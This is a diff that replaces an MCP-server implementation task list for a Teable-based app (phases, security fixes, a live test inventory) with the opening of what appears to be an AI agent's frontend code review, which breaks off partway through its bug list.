@@ -1,464 +1,322 @@
-# MCP Server — Implementation Task List
-
-Companion to `current-design.md`. That document decides *what* and *why*; this one decides
-*in what order* and *how each step is proven*.
-
-Branch: `feat-mcp-server`  ·  Base: `feat-db-setup`
-
-Legend: `[ ]` todo · `[~]` in progress · `[x]` done · **GATE** = stop, do not proceed until cleared.
-
----
-
-## Status — 2026-09-19
-
-**Code complete and verified live against the running dev instance.**
-
-Earlier status in this file claimed no database was available. That was wrong: the env lives at
-`apps/nextjs-app/.env.development.local` and the `platform-*` containers (Postgres `30898`,
-Redis `30490`) are the dev stack. Everything below was then re-verified against the real app.
-
-| Phase | State |
-|---|---|
-| 0 Design | ✅ signed off |
-| 1 Plan | ✅ 4 compile corrections, 4 runtime traps recorded |
-| 2 Foundation | ✅ Gate C cleared — real MCP SDK client handshake |
-| 3–5 Tools | ✅ 15 tools; catalogue matches design §5 exactly |
-| 6 Contract + UI | ✅ manifest returns all 15 tools live; page server-renders with i18n resolved. Browser interaction still user-driven |
-| 7 Tests | ✅ 35 unit tests + **22/22 live checks** against the real DB; e2e suite still unexecuted |
-| 8 Review | ✅ 3 security defects found and fixed (S1 high, S2 medium, S3 low) |
-| 9 Finalize | ⚠️ awaiting decision on commit/PR |
-
-### Verified live (real token, real database, real MCP SDK client)
-
-Read path and protocol:
-- handshake; `tools/list` returns exactly the 15 designed tools
-- `list_spaces` → `list_bases` → `list_tables` → `get_table_schema` → `query_records`
-- field ids returned correctly; `createdTime` flagged `isComputed: true` (R1 pinning works)
-- bad `tableId` → `isError` tool result, not a protocol abort
-- delete cap: 201 ids refused, nothing deleted
-- unknown tool → protocol error `-32602`
-- `GET`/`DELETE` → 405 + JSON-RPC body; no/bad token → 401
-
-Write path and recovery (22/22):
-- `create_table`, `create_field`, `create_view`, `delete_view`, `update_table`
-- `create_records` → `query_records` → `update_record` → `get_record` round-trip
-- `delete_records` removed **exactly one** row
-- **trash recovery proven**: the delete appeared in `/api/trash/items`, `POST /api/trash/restore/:id`
-  returned 201, the row count returned to its prior value, and the restored record kept its edited
-  value. This is design §6.1's premise — the justification for shipping no confirm-token flow —
-  now demonstrated end to end rather than argued from source.
-- `delete_field` / `delete_table` / `update_field` confirmed absent from the live catalogue
-
-### Still outstanding
-
-- **The S1 base-enumeration fix is not proven live.** The test token reaches everything its owner
-  owns, so the token-scope filter never had an out-of-scope base to hide. Unit-tested only;
-  the e2e permission matrix is the agreed way to close this.
-- **E2E suite never executed.** It targets `127.0.0.1:5432/teable` — the project's own
-  `teable-postgres` container (`dockers/database-postgres.yml`), **separate** from the dev database
-  on `30898`. Running it is safe for dev data; the container just needs starting.
-- **Browser interaction** is user-driven and in progress.
-
-**Nothing has been committed.** All work is in the working tree.
-
----
-
-## Phase 0 — Finalize the design  (no code)  ✅ COMPLETE
-
-- [x] 0.1 Read `current-design.md` end to end.
-- [x] 0.2 Resolve the four open questions:
-  - [x] `delete_field` / `delete_table` → **excluded from v1** (D5)
-  - [x] `update_field` / `convertField` → **excluded from v1** (D5)
-  - [x] `MCP_READONLY` default → **`false`** (D6)
-  - [x] Settings page → **instance-wide**; confirmed possible, no `baseId` in setup (D7)
-- [x] 0.3 Fold answers into `current-design.md`; §13 removed, D5–D7 added to §0.
-- [x] 0.4 Consequence of D5 absorbed: the confirm-token machinery is **dropped** — every remaining
-      destructive tool is recoverable through the existing table trash (design §6.1).
-- [x] **GATE A — design signed off.**
-
----
-
-## Phase 1 — Verified implementation plan  (no feature code)  ✅ COMPLETE
-
-- [x] 1.1 Re-read every signature §5 depends on. Recorded in `current-implementation-plan.md` §2.
-      Found 4 compile-level corrections (C1–C4) and 4 runtime traps (R1–R4).
-- [x] 1.2 Module exports confirmed. **C1:** `PermissionModule` IS `@Global()` and exports
-      `PermissionService` — do **not** import it (`TrashModule` is the precedent).
-      **C2:** `TableModule`/`RecordModule` do NOT export the open-api services; import the
-      `*OpenApiModule`s instead.
-- [x] **1.3 Trash retention verified — premise holds, and is stronger than assumed.**
-      `configs/trash.config.ts` declares `retention: 30d` / `scanInterval: 1h`, but the **only**
-      consumer is `config.module.ts:29` registering it. No `@Cron`, no `ScheduleModule` anywhere.
-      Trash rows persist until user-initiated restore, user-initiated reset, or permanent table
-      deletion. Recovery is currently **unbounded**; even the declared 30-day intent far exceeds
-      the window in which a bad delete would be noticed. **No change to design §6 required.**
-- [x] 1.4 `delete_view` confirmed: `operationId: generateOperationId()` is unconditional at
-      `view-open-api.service.ts:109`, same as record delete at `record-delete.service.ts:77`.
-      Trash capture does not depend on `windowId`.
-- [x] 1.5 `current-implementation-plan.md` written with the §0 corrections table.
-      (Prior Knowledge Graph contents recoverable at commit `aadc634`.)
-- [x] **GATE B — plan reviewed.** No correction changed scope; Phase 0 decisions stand.
-
----
-
-## Phase 2 — Foundation  (backend, no tools yet)  ✅ COMPLETE
-
-- [x] 2.1 Promote `@modelcontextprotocol/sdk` to a direct dep of `apps/nestjs-backend`, pinned to
-      `1.29.0` (already in the store via `@mastra/mcp` — expect no lockfile churn beyond one line).
-      Verify: `pnpm install --frozen-lockfile` still resolves.
-- [x] 2.2 `features/mcp/types.ts` — `IMcpTool`, `IMcpToolContext`.
-- [x] 2.3 `features/mcp/tool-registry.ts` — registry + the `authorize()` pipeline:
-      zod-parse → `resolveResource` → `validPermissions` → **`cls.set('permissions', …)`** → `execute`.
-  - [x] Boot-time assertion: empty `requiredActions` throws.
-  - [x] Sequential dispatch for batched calls — **never `Promise.all`** (design §4.3).
-- [x] 2.4 `features/mcp/mcp.service.ts` — per-request `McpServer` + stateless
-      `StreamableHTTPServerTransport` (`sessionIdGenerator: undefined`); dispose on response close.
-- [x] 2.5 `features/mcp/mcp.controller.ts` — `POST /api/mcp` with `@TokenAccess()` and **no**
-      `@Permissions`; `GET`/`DELETE` → 405 + JSON-RPC error body.
-- [x] 2.6 `features/mcp/mcp.module.ts`; register in `app.module.ts`. Honour `MCP_ENABLED`.
-- [x] 2.7 Config entries for the four vars in design §9.
-- [x] 2.8 Smoke test: real MCP SDK `Client` completes `initialize`, `tools/list` and `tools/call`
-      over a real socket (`mcp.service.spec.ts`, 6 tests).
-- [x] **GATE C — a real MCP client completes a handshake against the backend.**
-
----
-
-## Phase 3 — Read-only tools  ✅ COMPLETE
-
-- [x] 3.1 `tools/discovery.tools.ts` — `list_spaces`, `list_bases`, `list_tables`,
-      `get_table_schema`, `list_views`.
-  - [x] Enumeration is scope-filtered — no out-of-scope names, ever (design §4.4).
-- [x] 3.2 `tools/record.tools.ts` read half — `query_records`, `get_record`.
-  - [x] `fieldKeyType: FieldKeyType.Id` pinned explicitly on every read path (trap R1).
-  - [x] `take` default 50, hard cap `MCP_MAX_RECORDS_PER_CALL`, applied server-side after parsing.
-  - [x] **Deviation:** responses carry `{ returned, hasMore, nextSkip }`, not `total`.
-        `getRecords` returns no count, so `total` would need a second aggregation query per call.
-        `hasMore` is derived by over-fetching one row — cheaper and sufficient for paging.
-- [x] 3.3 Unit specs for schemas + resource resolution.
-- [x] 3.4 Verified live: a real MCP SDK client listed tables and queried records on the dev
-      instance via `list_spaces` → `list_bases` → `list_tables` → `query_records`.
-- [x] **GATE D — cleared.** Read path verified live against the dev database.
-
----
-
-## Phase 4 — Write tools  ✅ COMPLETE
-
-- [x] 4.1 `create_records`, `update_record`.
-- [x] 4.2 `delete_records`.
-  - [x] Hard cap `MCP_MAX_DELETE_PER_CALL` (200), enforced server-side after zod parsing.
-  - [x] Tool description states the operation is recoverable from the table trash and names the
-        UI path (design §6.2.4).
-  - [x] `destructiveHint: true`.
-- [x] 4.3 Error mapping: permission/validation/business failures → `isError: true` **tool results**;
-      protocol failures → JSON-RPC errors. Proven in `mcp.service.spec.ts`.
-  - [ ] 401 `WWW-Authenticate: Bearer` — still to add (phase-2 OAuth hook).
-- [x] 4.4 No stack traces or raw Prisma errors leave the process; log with a correlation id instead.
-- [x] 4.5 Delete → trash → restore proven **live** (not yet in CI; the e2e version is 7.2).
-- [x] **GATE E — cleared.** Writes verified live; trash recovery demonstrated end to end
-      (delete → trash item → restore → row back with its edited value intact).
-
----
-
-## Phase 5 — Additive schema tools  (D5: no deletes, no conversions)  ✅ COMPLETE
-
-- [x] 5.1 `create_table`.
-- [x] 5.2 `update_table` — name / description / icon metadata **only**. No structural change.
-- [x] 5.3 `create_field`.
-- [x] 5.4 `create_view`, `delete_view` (`destructiveHint: true`, trash-recoverable).
-- [x] 5.5 `MCP_READONLY` filter drops every non-read-only tool at registry construction.
-- [x] 5.6 Honest `annotations` on every tool.
-- [x] 5.7 **Assert the exclusions**: `delete_field`, `delete_table`, `update_field` must not appear
-      in the catalogue under any configuration. Guards against a well-meaning future PR adding them
-      without revisiting D5.
-- [x] **GATE F — catalogue matches design §5 exactly, exclusions included.**
-
----
-
-## Phase 6 — Contract + frontend  ⚠️ CODE COMPLETE, UI NOT BROWSER-VERIFIED
-
-- [x] 6.1 `packages/openapi/src/mcp/` — zod contract + typed client for `GET /api/mcp/manifest`.
-      Export from the package index. Follow the established const-array + `z.enum` idiom
-      (`<Thing>Values` + `(typeof X)[number]`), not `as const` object literals.
-- [x] 6.2 `mcp.manifest.controller.ts` — returns name/title/description/requiredActions/annotations.
-- [x] 6.3 `pages/setting/mcp.tsx` + `blocks/setting/mcp/McpPage.tsx`, following the
-      `personal-access-token.tsx` pattern. **Instance-wide** (D7) — no baseId anywhere in setup.
-- [x] 6.4 `ToolCatalogue.tsx` — grouped, showing required scopes and a destructive badge.
-- [x] 6.5 Token picker / creator; create path pre-selects exactly the scopes the chosen tool groups
-      need. Reuse `ScopesSelect` + `AccessTokenForm`. Token shown **once**, at creation.
-- [x] 6.6 `ConnectionSnippet.tsx` — `claude mcp add --transport http …` plus Desktop/Cursor JSON.
-- [x] 6.7 i18n keys into `common-i18n` / `i18n-keys`. No hard-coded English.
-- [x] 6.8 Add to settings nav.
-- [ ] 6.9 **Run the dev server and use the page in a browser** — create a token, copy the snippet,
-      connect a real client with it. **BLOCKED, NOT DONE.** No `.env` exists in the repo and no
-      Postgres is provisioned for this app; the only database reachable here is a shared
-      `platform-pgvector` container that the e2e seed would reset. Provisioning it is a change to
-      shared infrastructure, so it was not attempted. **The UI is typechecked and linted but has
-      never been rendered.** Treat every visual/interaction claim as unverified.
-- [ ] **GATE G — NOT CLEARED.** Requires 6.9.
-
----
-
-## Phase 7 — Test suite
-
-- [x] 7.1 Unit specs green: registry, schemas, resource resolution, read-only filter, both caps.
-      **31 tests passing** — `tool-registry.spec.ts` (25) and `mcp.service.spec.ts` (6). The latter
-      drives the real MCP SDK `Client` over a real socket against a stubbed registry, so protocol
-      compliance is proven without a database.
-      **Do not create `mcp.controller.spec.ts`** — `vitest.config.ts:39` excludes
-      `**/*.controller.spec.ts` and it would silently run zero tests and exit 0.
-- [~] 7.2 `test/mcp.e2e-spec.ts` **written and typechecked, never executed** — same blocker as 6.9.
-      Driven by the real MCP SDK `Client`; PATs minted via the typed `@teable/openapi` clients;
-      `initApp()`; vitest; no supertest.
-- [~] 7.3 **The permission matrix** (design §10.3) — the acceptance gate.
-      **Every case below is WRITTEN in `test/mcp.e2e-spec.ts` but UNVERIFIED** (no database):
-  - [ ] base-A token on base B → `RESTRICTED_RESOURCE`
-  - [ ] token lacking `record|delete` → `delete_records` fails even though the user could
-  - [ ] user demoted after minting a write token → fails (intersection)
-  - [ ] `list_bases` with a base-scoped token leaks no other base name
-  - [ ] `delete_records` above the cap → rejected, nothing deleted
-  - [ ] `delete_records` then trash restore → records return intact
-  - [ ] `MCP_READONLY=true` → catalogue contains no write tool
-  - [ ] every tool has non-empty `requiredActions`
-  - [ ] every tool reached `authorize()` before `execute()` (pipeline spy)
-  - [ ] `delete_field` / `delete_table` / `update_field` absent from the catalogue
-- [x] 7.4 Typecheck and lint clean for all MCP code (backend, openapi, frontend).
-      One pre-existing, unrelated failure remains: `KnowledgeGraph.spec.tsx` TS2739.
-- [~] 7.5 Unit tests green; `openapi` and `common-i18n` build. Full `pnpm test` includes e2e,
-      which cannot run here.
-- [ ] **GATE H — NOT CLEARED.** The matrix is written but has never run. This is the single
-      most important outstanding item: the authorization path is unit-tested against mocks, but
-      never against the real `PermissionService` and a real database.
-
----
-
-## Phase 8 — Review  ✅ COMPLETE (manual; 3 defects found and fixed)
-
-- [x] 8.1 Security review of the §4 authorization path. The `/security-review` skill could not run
-      (`no merge base` against `origin/HEAD`), so this was done by hand, reading every service each
-      tool calls. **Three real defects found and fixed:**
-  - [x] **S1 — base enumeration leak (HIGH).** `list_bases` with no `spaceId` resolved to no
-        resource, so `validPermissions` never ran, and `BaseService.getAllBaseList` filters by
-        USER but **not by TOKEN** (unlike `SpaceService.getSpaceList`, which applies
-        `filterSpaceListWithAccessToken` at `space.service.ts:117`). A token restricted to one base
-        would therefore enumerate every base its owner could see. Fixed by filtering on the token's
-        `spaceIds`/`baseIds` in the tool, mirroring `permission.service.ts:243-245`. Three
-        regression tests added.
-  - [x] **S2 — validation bypass (MEDIUM).** `create_table` and `create_field` skipped the zod
-        schemas the REST controllers apply (`tableRoSchema` at
-        `table-open-api.controller.ts:154`, `createFieldRoSchema` at
-        `field-open-api.controller.ts:124`), making MCP the laxer door into the same services.
-        Both now parse with the same schemas.
-  - [x] **S3 — error detail leak (LOW).** `toSafeMessage` returned any `Error.message`, so a Prisma
-        error would have exposed query fragments and table names to the model. Now only
-        `HttpException` messages (deliberately user-facing, i18n-keyed) pass through; everything
-        else returns a generic line and the real error goes to the log. Regression test added.
-- [x] 8.2 Code review. Also corrected a comment in `discovery.tools.ts` that became inaccurate
-      after the S1 fix — it claimed both list tools relied on service-side token filtering, which
-      was only ever true of `list_spaces`.
-- [x] 8.3 Risk table audited. Every §12 mitigation shipped; the trash-retention risk was
-      downgraded by task 1.3 (no pruning is implemented at all).
-- [x] 8.4 Verified: no tool reaches any dependency outside the injected context, and `invoke()`
-      is the only path to `execute()`. Checked mechanically as well as by reading.
-- [x] 8.5 Largest source file is 180 lines (`tool-registry.ts`); largest overall is the 386-line
-      unit spec. All well under 500.
-- [x] 8.6 Change is additive. Modified outside the new files: `app.module.ts` (+3),
-      `config.module.ts` (+2), `package.json` (+1), `.eslintrc.js` (+10, scoped override for the
-      MCP SDK's subpath exports), `openapi/src/index.ts` (+1), and the i18n registration.
-- [x] **GATE I — cleared.** S1, S2 and S3 fixed with regression tests; the create-without-delete
-      asymmetry is consciously accepted and recorded in design §5.
-
----
-
-## Phase 9 — Finalize
-
-- [ ] 9.1 Manual end-to-end with real Claude Code: discovery, one read, one write, one delete,
-      then restore from trash. **NOT DONE** — no database available (see 6.9).
-- [x] 9.2 Operator notes live in `current-design.md` §9 (the four env vars) and §6.2 (recovery).
-      No new doc file created, per CLAUDE.md.
-- [x] 9.3 `current-design.md` reflects what shipped; `current-implementation-plan.md` §0 carries
-      the corrections found during Phase 1.
-- [ ] 9.4 **Nothing committed.** All work is in the working tree, awaiting review.
-- [ ] 9.5 Decide with the user: PR into `feat-db-setup`, or hold the branch.
-- [ ] **GATE J — NOT CLEARED.** Blocked on Gates G and H, both of which need a database.
-
----
-
-## Sequencing notes
-
-- Gates A, B, H and I are the real ones. C–G are progress checkpoints; **H and I are refusals** —
-  do not ship past them.
-- **Task 1.3 (trash retention) is design-affecting.** If retention is short, design §6.1's premise
-  weakens and §6.2 needs a stronger guard. Do it before any code.
-- Phases 3→4→5 are ordered by blast radius. Each proves the authorization pipeline against a wider
-  surface before the next widens it further.
-- Phase 6 can start once Phase 3 lands (the manifest only needs the registry), but the page is not
-  demoable until Phase 5 fills the catalogue.
-- Phase 7 is written as a phase for clarity; in practice tests land **with** each phase. Nothing
-  reaches Phase 8 with untested tools.
-- D5 shrank the surface substantially. If the work feels larger than the catalogue justifies,
-  something has drifted — re-read §5 before adding anything.
-
----
-
-## Appendix — Live test inventory (2026-09-19)
-
-Run against the dev instance (`localhost:3000`, Postgres `30898`) with a real PAT and the
-real MCP SDK client. Fixture tables are created and permanently deleted by the run, so it
-leaves no residue. Script: `mcp-full-suite.mjs` (scratchpad, not committed).
-
-**112/112 passed.**
-
-
-### 1. Catalogue & protocol
-
-- [x] `C1` exactly 15 tools exposed
-- [x] `C2` every tool has a description
-- [x] `C3` every tool has an input schema
-- [x] `C4` annotations present on all tools
-- [x] `C5:delete_field` excluded tool "delete_field" absent
-- [x] `C5:delete_table` excluded tool "delete_table" absent
-- [x] `C5:update_field` excluded tool "update_field" absent
-- [x] `C5:convert_field` excluded tool "convert_field" absent
-- [x] `C5:delete_base` excluded tool "delete_base" absent
-- [x] `C5:sql_query` excluded tool "sql_query" absent
-- [x] `C6` destructive tools flagged
-- [x] `C7` read tools flagged readOnly
-- [x] `C8` write tools NOT flagged readOnly
-- [x] `C9` unknown tool rejected
-
-### 2. Discovery tools
-
-- [x] `D1` list_spaces happy path
-- [x] `D2` list_spaces returns id+name only
-- [x] `D3` list_bases with no spaceId
-- [x] `D4` list_bases with valid spaceId
-- [x] `D5` list_bases with non-existent spaceId errors
-- [x] `D6` list_bases rejects a baseId passed as spaceId
-- [x] `D7` list_tables happy path
-- [x] `D8` list_tables missing baseId rejected
-- [x] `D9` list_tables non-existent baseId errors
-- [x] `D10` list_tables rejects a spaceId passed as baseId (S5 fix)
-
-### 3. create_table (also the fixture for later sections)
-
-- [x] `T1` create_table with name+description
-- [x] `T2` create_table with explicit fields
-- [x] `T3` create_table with invalid field type rejected (S2 fix)
-- [x] `T4` create_table missing name rejected
-- [x] `T5` create_table non-existent baseId errors
-
-### 4. get_table_schema / list_views
-
-- [x] `S1` get_table_schema happy path
-- [x] `S2` primary field is flagged
-- [x] `S3` schema reports baseId
-- [x] `S4` get_table_schema non-existent table errors
-- [x] `S5` list_views happy path
-- [x] `S6` list_views non-existent table errors
-
-### 5. create_field
-
-- [x] `F1` create_field longText
-- [x] `F2` create_field number
-- [x] `F3` create_field singleSelect with choices
-- [x] `F4` create_field invalid type rejected (S2 fix)
-- [x] `F5` create_field missing type rejected
-- [x] `F6` create_field non-existent table errors
-- [x] `F7` new fields appear in schema
-
-### 6. create_records
-
-- [x] `R1` create_records single
-- [x] `R2` create_records multiple with typed fields
-- [x] `R3` create_records empty array rejected
-- [x] `R4` create_records missing records rejected
-- [x] `R5` create_records with empty fields creates a blank row
-- [x] `R6` create_records with unknown field id
-- [x] `R7` create_records typecasts a numeric string
-- [x] `R8` create_records over maxRecordsPerCall rejected
-
-### 7. query_records / get_record
-
-- [x] `Q1` query_records returns the created rows
-- [x] `Q2` response carries returned/hasMore/nextSkip
-- [x] `Q3` take=1 returns exactly 1 and hasMore
-- [x] `Q4` paging via nextSkip returns a different row
-- [x] `Q5` take above cap is clamped, not rejected
-- [x] `Q6` take=0 rejected by schema
-- [x] `Q7` negative take rejected
-- [x] `Q8` negative skip rejected
-- [x] `Q9` skip beyond end returns empty, hasMore false
-- [x] `Q10` projection limits returned fields
-- [x] `Q11` projection with unknown field id
-- [x] `Q12` query_records with a valid viewId
-- [x] `Q13` query_records with bad viewId errors
-- [x] `Q14` query_records search returns a hit
-- [x] `Q15` query_records non-existent table errors
-- [x] `Q16` get_record happy path
-- [x] `Q17` get_record keys cells by field id (R1 trap)
-- [x] `Q18` get_record non-existent record errors
-- [x] `Q19` get_record missing recordId rejected
-
-### 8. update_record
-
-- [x] `U1` update_record changes a cell
-- [x] `U2` partial update leaves other cells intact
-- [x] `U3` update_record non-existent record errors
-- [x] `U4` update_record unknown field id
-- [x] `U5` update_record missing fields rejected
-
-### 9. delete_records + trash recovery
-
-- [x] `X1` delete_records over cap rejected
-- [x] `X2` over-cap delete mutated nothing
-- [x] `X3` delete_records empty array rejected
-- [x] `X4` delete_records with non-existent id
-- [x] `X5` delete_records removes one row
-- [x] `X6` delete_records advertises recoverability
-- [x] `X7` exactly one row removed
-- [x] `X8` delete appears in the table trash
-- [x] `X9` trash restore succeeds
-- [x] `X10` row count returns to pre-delete value
-- [x] `X11` restored record keeps its edited values
-
-### 10. create_view / delete_view
-
-- [x] `V1` create_view grid
-- [x] `V2` create_view defaults to grid
-- [x] `V3` create_view invalid type rejected (S4 fix)
-- [x] `V4` create_view missing name rejected
-- [x] `V5` delete_view removes it
-- [x] `V6` deleted view no longer listed
-- [x] `V7` delete_view non-existent view errors
-
-### 11. update_table
-
-- [x] `M1` update_table renames
-- [x] `M2` update_table sets description
-- [x] `M3` update_table accepts null description
-- [x] `M4` update_table sets icon
-- [x] `M5` update_table with no changes rejected
-- [x] `M6` update_table non-existent table errors
-- [x] `M7` rename is visible in list_tables
-
-### 12. Transport & auth
-
-- [x] `A1` POST without a token is 401
-- [x] `A2` POST with a bad token is 401
-- [x] `A3:GET` GET returns 405 with a JSON-RPC body
-- [x] `A3:DELETE` DELETE returns 405 with a JSON-RPC body
-- [x] `A4` manifest returns all 15 tools
-- [x] `A5` manifest reports the endpoint and limits
-- [x] `A6` manifest requires auth
-
-### 13. Error hygiene
-
-- [x] `E1` no stack traces in error text
-- [x] `E2` no file paths in error text
-- [x] `E3` no raw SQL in error text
-- [x] `E4` errors are human-readable
-
-### 14. Cleanup
-
-- [x] `Z:tblOYQLIXAP5OcEyQBH` removed fixture table tblOYQLIXAP5OcEyQBH
-- [x] `Z:tblVBUj7aaaxbh8hzBr` removed fixture table tblVBUj7aaaxbh8hzBr
+● Frontend review: apps/nextjs-app (branch dev @ d529dd7)
+
+  The frontend has real security holes. I found three High-severity script-execution or data-leak bugs and a set of Medium configuration problems. Two of
+  the High ones are in code this fork added (the graph tooltip XSS and the AI-chat state bleed between bases); the rest are inherited from upstream Teable
+  but still live in this deployment.
+
+  Scope. I reviewed the whole Next.js app. I went deepest on the roughly 22k lines added since the Teable import (fd44761), and a separate pass swept the
+  whole app for security. I confirmed every High and the most important Medium findings against the source myself. The structure and bug findings come from
+  four parallel reviewers, each told to read the code and drop anything it couldn't confirm. Paths are relative to apps/nextjs-app/src/ unless they start
+  with apps/. [fork] marks code this repo added; [upstream] marks code inherited from Teable that is still live here.
+
+  Build checks:
+
+  ┌────────────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┐
+  │   Check    │                                                                 Result                                                                 │
+  ├────────────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+  │ tsc        │ ✅ passes                                                                                                                              │
+  │ --noEmit   │                                                                                                                                        │
+  ├────────────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+  │ vitest     │ ⚠️  149/151 pass. The 2 failures (the Delete/Duplicate selection-progress dialogs) are 5s timeouts during the full parallel run; both   │
+  │            │ pass on their own, so they are flaky, not broken                                                                                       │
+  ├────────────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┤
+  │ eslint src │ ❌ 1 error (features/app/hooks/useBrand.tsx:20, Prettier formatting) and 18 warnings (unused variables, plus a missing dependency in   │
+  │            │ useSettingRoute.tsx:64)                                                                                                                │
+  └────────────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────┘
+
+  ---
+
+  1. Code structure
+
+  1.1 How the app is put together today
+
+  ┌──────────────┬──────────────────────────────────────────────┬───────────────────────────────────────────────────────────────────────────────────────┐
+  │    Layer     │                    Where                     │                                   Principle in use                                    │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │              │                                              │ Pages stay thin. getServerSideProps is wrapped in                                     │
+  │ Routing /    │ pages/** (Next pages router)                 │ withEnv(ensureLogin(withAuthSSR(...))), and server-side calls use backend/api/rest/*  │
+  │ SSR          │                                              │ (an axios client pinned to localhost:$PORT, forwarding cookies). Data is prefetched   │
+  │              │                                              │ into a QueryClient and handed to the client by dehydrating it.                        │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │ Layouts      │ features/app/layouts/*                       │ One layout per area (Base, Space, Setting, Admin, Share…). Each sets up the SDK       │
+  │              │                                              │ providers and side panels.                                                            │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │ Feature      │ features/app/blocks/<feature>/               │ Organised by feature: view/grid, base-graph, email, chat-panel, schema-onboarding and │
+  │ blocks       │                                              │  so on. Each block owns its components, hooks and small stores.                       │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │ Shared app   │ features/app/components/**                   │ Pieces used across features: field settings, collaborators, plugins, settings.        │
+  │ components   │                                              │                                                                                       │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │              │                                              │ API calls (packages/openapi), query keys (ReactQueryKeys), realtime model hooks       │
+  │ Domain SDK   │ packages/sdk (@cybernetics/sdk)              │ (useTable, useFields, useView…). Features are meant to go through the SDK rather than │
+  │              │                                              │  call the API directly.                                                               │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │ Design       │ packages/ui-lib (@teable/ui-lib/shadcn)      │ Shared shadcn/Radix primitives, imported by about 511 files.                          │
+  │ system       │                                              │                                                                                       │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │ Server state │ react-query                                  │ About 327 uses of the central ReactQueryKeys and about 83 ad-hoc string keys.         │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │              │ zustand (23 small stores), useReducer for    │ Stores are small, one per concern. URL-encoded state is validated with zod            │
+  │ Client state │ wizards, URL query params for shareable      │ (queryCodec).                                                                         │
+  │              │ state (graph ?q=, ?focus=)                   │                                                                                       │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │ Pure logic   │ e.g. base-graph/utils/*,                     │ Kept apart from components and covered by unit specs. The newer fork code does this   │
+  │              │ schema-onboarding/state.ts                   │ well.                                                                                 │
+  ├──────────────┼──────────────────────────────────────────────┼───────────────────────────────────────────────────────────────────────────────────────┤
+  │ i18n         │ next-i18next with features/i18n/*.config.ts  │ Each page loads only its own translation namespaces.                                  │
+  │              │ namespaces per page                          │                                                                                       │
+  └──────────────┴──────────────────────────────────────────────┴───────────────────────────────────────────────────────────────────────────────────────┘
+
+  The intended principles are sound: thin pages, feature-sliced blocks, an SDK as the single way to the backend, pure functions tested apart from the UI,
+  and URL state for anything shareable. The newer fork code (base-graph, schema-onboarding, email) mostly follows them, with good pure/UI separation and
+  spec coverage.
+
+  1.2 Where the structure breaks down
+
+  1. A second, unused design system [fork].
+     - components/ui/* is a second shadcn set. It is used only by components/ai-elements and one file, auth/DescContent.tsx.
+     - Of the 25 vendored ai-elements files, 19 (about 3.3k lines) are never imported, including agent, artifact, canvas, sandbox, terminal, open-in-chat
+       and voice-selector.
+     - Its styles have drifted from ui-lib (for example, Button has no xs size and no dark variants), so the chat panel mixes two looks.
+     - It also pulls in heavy dependencies (@xyflow/react, media-chrome, shiki, tokenlens).
+     - Fix: point the 6 used ai-elements at @teable/ui-lib/shadcn, then delete components/ui and the unused elements.
+  2. Bypassing the import alias. chat-panel/* imports '../../../../../../components/ai-elements/...' (6 levels up) instead of @/components/....
+  3. Dependencies pointing the wrong way.
+     - components/setting/integration imports ImapConnectForm from blocks/email, so a shared component depends on a feature block.
+     - components/* imports from features/* (TeableLogo, Guide, ChangelogNotification).
+     - Fix: move shared pieces down a layer.
+  4. Duplicated logic.
+     - There are two OAuth launchers: useOAuthPopup and openConnectIntegration. The second sends callBackType/integrationId, which the backend ignores.
+     - maskEmail exists on both client and server.
+     - The metadata-email cast is copied twice.
+  5. Oversized files. 22 files exceed the project's 500-line rule.
+     - The fork-added ones are ChatPanel.tsx (711), prompt-input.tsx (1314) and code-block.tsx (523).
+     - ChatPanel.tsx mixes upload, streaming, persistence, selection-to-context and layout. Split it into useChatStream, useChatUpload, useChatPersistence
+       and useSelectionContext.
+  6. A 704 KB static bundle. features/help/helpPages.ts is HTML scraped from help.teable.ai and statically imported by BaseLayout, so it ships in every base
+     page's JavaScript. Load it lazily or fetch it as JSON.
+  7. Query-key discipline. New code mostly uses inline keys (['email-sources', baseId], ['base-usage', baseId]), so cross-feature invalidation gets missed.
+     Examples: deleting an integration doesn't refresh email status, and installing packs doesn't refresh the graph schema. Register them in ReactQueryKeys.
+  8. Committed tooling files [fork].
+     - 9 .claude-flow/data/pending-insights.jsonl files sit inside src/ and leak /home/avarile/... paths.
+     - Also committed: msapplication-icon-144x144 copy.png, babel.config.backup.js and .idea/*.
+     - Fix: remove them and add .claude-flow/ to .gitignore and .dockerignore.
+  9. Test gaps. No specs cover the code where the bugs below are: ChatPanel, both graph canvases, ai-context.utils.ts (pure, 347 lines), graphTheme.ts, the
+     help feature, and the email dialogs.
+  10. i18n leaks.
+      - 41 ai.chat.*/ai.files.* keys are missing in every locale except en and zh.
+      - admin.setting.ai.* keys are missing even in en and zh.
+      - Hardcoded English appears in HelpModal, GraphQueryPanel ("OK"), preset labels and APIDialogContent ("Token").
+
+  ---
+
+  2. Bugs
+
+  High
+
+  #: B1
+  Where: features/app/blocks/table/chat-panel/ChatPanel.tsx:66-81, 182-212 [fork]                       
+  Defect → failure: Chat messages, agent and thread are read from localStorage only once, when the panel first mounts. No key={baseId} exists on
+  Table/TablePage. After client-side navigation from base A to base B, A's conversation overwrites chat-history:B, and A's Mastra threadId  is reused for 
+  B. Threads are scoped per user, not per base, so the agent carries what it saw in base A into base B.
+  ────────────────────────────────────────
+  #: B2
+  Where: ChatPanel.tsx:518-537 together with ChatInputArea.tsx:232-253 [fork]
+  Defect → failure: Switching agent while a reply is streaming doesn't abort the stream, and the selector stays enabled. setMessages([]) runs, then the next
+  
